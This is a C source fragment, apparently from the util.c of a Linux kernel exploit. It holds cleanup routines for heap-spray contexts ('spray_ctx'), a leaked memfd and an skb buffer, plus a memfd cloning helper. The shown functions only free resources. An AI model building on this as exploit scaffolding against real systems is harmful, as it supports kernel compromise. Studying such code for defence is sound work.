void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

/* rest of util.c unchanged */
